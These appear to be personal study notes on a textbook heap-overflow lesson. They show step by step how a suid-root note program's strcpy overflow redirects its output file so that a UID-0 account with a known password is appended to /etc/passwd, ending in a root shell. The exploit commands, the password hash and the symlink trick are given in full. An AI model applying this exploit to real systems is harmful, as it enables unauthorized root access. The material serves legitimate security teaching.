The notetaker program from Chapter 2 is also susceptible to a buffer overflow vulnerability
2 buffers are allocated on the heap, and the first command-line argument is copied into the first buffer
An overflow can occur here

Excerpt from notetaker.c
__________________________________________________________________________________
buffer = (char *) ec_malloc(100);
datafile = (char *) ec_malloc(20);
strcpy(datafile, "/var/notes");

if(argc < 2) // If there aren't command-line arguments,
    usage(argv[0], datafile); // dusokay usage message and exit

*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
strcpy(buffer, argv[1]); // Copy into buffer
*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-

printf("[DEBUG] buffer   @ %p: \'%s\'\n", buffer, buffer);
printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);
__________________________________________________________________________________

Under normal conditions, the buffer allocation is located at 0x804a008, which is before the datafile allocation at 0x804a070, as the debugging output shows
The distance between these 2 addresses is 104 bytes

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./notetaker test
[DEBUG] buffer   @ 0x804a008: 'test'
[DEBUG] datafile @ 0x804a070: '/var/notes'
[DEBUG] file descriptor is 3
Note has been saved.
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0x804a070 - 0x804a008
$1 = 104
(gdb) quit
__________________________________________________________________________________

Since the first buffer is null terminated, the maximum amount of data that can be put into this buffer without overflowing into the next should be 104 bytes

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "A"x104')
[DEBUG] buffer @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[DEBUG] datafile @ 0x804a070: ''
[!!] Fatal Error in main() while opening file: No such file or directory
__________________________________________________________________________________

As predicted, when 104 bytes are tried, the null-termination byte overflows into the beginning of the datafile buffer
This causes the datafile to be nothing but a single null byte, which obviously cannot be opened as a file
But what if the datafile is overwritten with something more than just a null byte?

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "A"x104 . "testfile"')
[DEBUG] buffer @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile'
[DEBUG] datafile @ 0x804a070: 'testfile'
[DEBUG] file descriptor is 3
Note has been saved.
*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***
======= Backtrace: =========
/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]
/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]
./notetaker[0x8048916]
/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]
./notetaker[0x8048511]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker 
08049000-0804a000 rw-p 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker 
0804a000-0806b000 rw-p 0804a000 00:00 0          [heap] 
b7d00000-b7d21000 rw-p b7d00000 00:00 0     
b7d21000-b7e00000 ---p b7d21000 00:00 0     
b7e83000-b7e8e000 r-xp 00000000 07:00 15444      /rofs/lib/libgcc_s.so.1 
b7e8e000-b7e8f000 rw-p 0000a000 07:00 15444      /rofs/lib/libgcc_s.so.1 
b7e99000-b7e9a000 rw-p b7e99000  00:00  0     
b7e9a000-b7fd5000 r-xp 00000000  07:00  15795    /rofs/lib/tls/i686/cmov/libc-2.5.so 
b7fd5000-b7fd6000 r--p 0013b000  07:00  15795    /rofs/lib/tls/i686/cmov/libc-2.5.so 
b7fd6000-b7fd8000 rw-p 0013c000  07:00  15795    /rofs/lib/tls/i686/cmov/libc-2.5.so 
b7fd8000-b7fdb000 rw-p b7fd8000  00:00  0     
b7fe4000-b7fe7000 rw-p b7fe4000  00:00  0     
b7fe7000-b8000000 r-xp 00000000  07:00  15421    /rofs/lib/ld-2.5.so 
b8000000-b8002000 rw-p 00019000  07:00  15421    /rofs/lib/ld-2.5.so 
bffeb000-c0000000 rw-p bffeb000  00:00  0        [stack] 
ffffe000-fffff000 r-xp 00000000  00:00  0        [vdso] 
Aborted
__________________________________________________________________________________

This time, the overflow is designed to overwrite the datafile buffer with the string testfile
This causes the program to write to testfile instead of /var/notes, as it was originally programmed to do
However, when the heap memory is freed by the free() command, errors in the heap headers are detected and the program is terminated
Similar to the return address overwrite with stack overflow, there are control points within the heap architecture itself
The most recent version of glibc uses heap memory management functions that have evolved specifically to counter heap unlinking attacks
Since version 2.2.5, these functions have been rewritten to print debugging information and terminate the program when they detect problems with the heap header information
This makes heap unlinking in Linux very difficult
However, this particular exploit doesn't use heap header information to do its magic, so by the time free() is called, the program has already been tricked into writing to a new file with root privileges

__________________________________________________________________________________
reader@hacking:~/booksrc $ grep -B10 free notetaker.c

    if(write(fd, buffer, strlen(buffer)) == -1) // Write note.
       fatal("in main() while writing buffer to file");
    write(fd, "\n", 1); // Terminate line.
    
// Closing file
    if(close(fd) == -1)
        fatal("in main() while closing file");

    printf("Note has been saved.\n");
    free(buffer);
    free(datafile);
reader@hacking:~/booksrc $ ls -l ./testfile
-rw------- 1 root reader 118 2007-09-09 16:19 ./testfile
reader@hacking:~/booksrc $ cat ./testfile
cat: ./testfile: Permission denied
reader@hacking:~/booksrc $ sudo cat ./testfile
?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtestfile
__________________________________________________________________________________

A string is read until a null byte is encountered, so the entire string is written to the file as the userinput
Since this is a suid root program, the file that is created is owned by root
This also means that since the filename can be controlled, data can be appended to any file
This data does have some restrictions, though; it must end with the controlled filename, and a line with the user ID will be written, also

There are probably several clever ways to exploit this type of capability
The most apparent one would be to append something to the /etc/passwd file
This file contains all of the usernames, IDs and login shells for all the users of the system
Natuarlly, this is a critical system file, so it is a good idea to make a backup copy before messing with it too much

__________________________________________________________________________________
reader@hacking:~/booksrc $ cp /etc/passwd /tmp/passwd.bkup
reader@hacking:~/booksrc $ head /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
__________________________________________________________________________________

The fields in the /etc/passwd files are delimited by colons, the first field being for login name, then password, user ID, group ID, username(display name), home directory, and finally the login shell
The password fields are all filled with the x character, since the encrypted passwords are stored elsewhere in a shadow file(However, this field can contains the encrypted password)
In addition, any entry in the password file that has a user ID of 0 will be given root privileges
That means the gaol is to append an extra entry with both root privileges and a known password to the password file

The password can be encrypted by using a one-way hashing algorithm
Beacuse the algorithm is one way, the original password cannot be recreated from the hash value
To prvent lookup attacks, the algorithm uses a salt value, which when varied creates a different hash value for the same input password
This is a common operation and Perl has a crypt() function that performs it
The first argument is the password, and the second is the salt value
The same password with a different salt produces a different hash

__________________________________________________________________________________
reader@hacking:~/booksrc $ perl -e 'print crypt("password", "AA"). "\n"'
AA6tQYSfGxd/A
reader@hacking:~/booksrc $ perl -e 'print crypt("password", "XX"). "\n"'
XXq2wKiyI43A2
__________________________________________________________________________________

Notice that the salt value is always at the beginning of the hash
When a user logs in and enters a password, the system looks up the encrypted password(in the passwd file) for that user
Using the salt value from the stored encryptd password, the system uses the same one-way hashing algorithm to encrypt whatever the user typed as the password
       In Perl, (maybe same with Linux) the salt length will always be 2.
       So, first 2 characters of the hash will be the salt
Finally, the system compares the two hashes; if they are the same, the user must have entered the correct password
This allows the password to be used for authentication without requiring that the password be stored anywhere on the system

Using one of these hashes in the password field will  make the password for the account be password, regardless of the salt value used
The line to append to /etc/passwd should look something like this:
__________________________________________________________________________________
myroot:XXq2wKiyI43A2:0:0:me:/root:/bin/bash
__________________________________________________________________________________

However, the nature of this particular heap overflow epxloit won't allow that exact line to be written to /etc/passwd, because the string must end with /etc/passwd(to append to /etc/passwd)
However, if that filename is merely appended to the end of the entry, the passwd file entry would be incorrect(since the last field of the user in /etc/passwd should poin to the login shell)
This can be compensated for with the clever use of a symbolic file link, so the entry can both end with /etc/passwd and still be a valid line in the password file

__________________________________________________________________________________
reader@hacking:~/booksrc $ mkdir /tmp/etc
reader@hacking:~/booksrc $ ln -s /bin/bash /tmp/etc/passwd
reader@hacking:~/booksrc $ ls -l /tmp/etc/passwd
lrwxrwxrwx 1 reader reader 9 2007-09-09 16:25 /tmp/etc/passwd -> /bin/bash
__________________________________________________________________________________

Now /tmp/etc/passwd points to the login shell /bin/bash
This means that a valid login shell for the password file is also /tmp/etc/passwd, making the following a valid password file line:

__________________________________________________________________________________
myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp/etc/passwd
__________________________________________________________________________________

The values of this line just needs to be slightly modified so that the portion before /etc/passwd is exactly 104 bytes long:

__________________________________________________________________________________
reader@hacking:~/booksrc $ perl -e 'print "myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp"' | wc -c
38
reader@hacking:~/booksrc $ perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x50 . ":/root:/tmp"'
| wc -c
86
reader@hacking:~/booksrc $ gdb -q
(gdb) p 104 - 86 + 50
$1 = 68
(gdb) quit
reader@hacking:~/booksrc $ perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x68 . ":/root:/tmp"' | wc -c
104
__________________________________________________________________________________

If /etc/passwd is added to the end of that final string, the string above will be appended to the end of the /etc/passwd file
And since this line defines an account with root privileges with a password we set, it won't be difficult to access this account and obtain root access:

__________________________________________________________________________________
reader@hacking:~/booksrc $ ./notetaker $(perl -e 'print "myroot:XXq2wKiyI43A2:0:0:" . "A"x68 . ":/root:/tmp/etc/passwd"')
[DEBUG] buffer @ 0x804a008: 'myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'
[DEBUG] datafile @ 0x804a070: '/etc/passwd'
[DEBUG] file descriptor is 3
Note has been saved.
*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***
======= Backtrace: =========
/lib/tls/i686/cmov/libc.so.6[0xb7f017cd]
/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]
./notetaker[0x8048916]
/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]
./notetaker[0x8048511]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker 
08049000-0804a000 rw-p 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker 
0804a000-0806b000 rw-p 0804a000 00:00 0          [heap] 
b7d00000-b7d21000 rw-p b7d00000 00:00 0     
b7d21000-b7e00000 ---p b7d21000 00:00 0     
b7e83000-b7e8e000 r-xp 00000000 07:00 15444      /rofs/lib/libgcc_s.so.1 
b7e8e000-b7e8f000 rw-p 0000a000 07:00 15444      /rofs/lib/libgcc_s.so.1 
b7e99000-b7e9a000 rw-p b7e99000 00:00 0     
b7e9a000-b7fd5000 r-xp 00000000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so 
b7fd5000-b7fd6000 r--p 0013b000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so 
b7fd6000-b7fd8000 rw-p 0013c000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so 
b7fd8000-b7fdb000 rw-p b7fd8000 00:00 0     
b7fe4000-b7fe7000 rw-p b7fe4000 00:00 0     
b7fe7000-b8000000 r-xp 00000000 07:00 15421      /rofs/lib/ld-2.5.so 
b8000000-b8002000 rw-p 00019000 07:00 15421      /rofs/lib/ld-2.5.so 
bffeb000-c0000000 rw-p bffeb000 00:00 0          [stack] 
ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso] 
Aborted
reader@hacking:~/booksrc $ tail /etc/passwd
avahi:x:105:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
cupsys:x:106:113::/home/cupsys:/bin/false
haldaemon:x:107:114:Hardware abstraction layer,,,:/home/haldaemon:/bin/false
hplip:x:108:7:HPLIP system user,,,:/var/run/hplip:/bin/false
gdm:x:109:118:Gnome Display Manager:/var/lib/gdm:/bin/false
matrix:x:500:500:User Acct:/home/matrix:/bin/bash
jose:x:501:501:Jose Ronnick:/home/jose:/bin/bash
reader:x:999:999:Hacker,,,:/home/reader:/bin/bash
?
myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd
reader@hacking:~/booksrc $ su myroot
Password:
root@hacking:/home/reader/booksrc# whoami
root
__________________________________________________________________________________